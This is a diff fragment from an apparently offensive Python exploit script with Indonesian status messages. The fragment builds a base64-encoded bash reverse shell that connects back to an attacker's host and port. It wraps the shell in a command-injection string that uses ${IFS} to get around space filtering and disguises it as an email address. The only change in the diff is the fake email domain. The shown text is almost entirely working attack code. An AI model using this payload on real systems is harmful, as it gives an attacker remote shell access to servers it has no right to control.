@@ -41,7 +41,7 @@ def delivery_payload_and_exploit(token):
 ##################  payload creation using bash one liner in b64  ##################
     rev = f'bash -i >& /dev/tcp/{localhost}/{port} 0>&1' # Can be adapted for others S.O or enviroments :p
     rev = base64.b64encode(rev.encode('utf-8')).decode('utf-8')
-    payload = f'pwnshell&echo${IFS}{rev}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@foryou.com' #IFS = ' ' blank or space xd
+    payload = f'pwnshell&echo${IFS}{rev}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@priasantai.org' #IFS = ' ' blank or space xd
     encoded_payload = quote(payload)
     print("[+] Pembuatan Payload Remote Code!") 
     time.sleep(2)
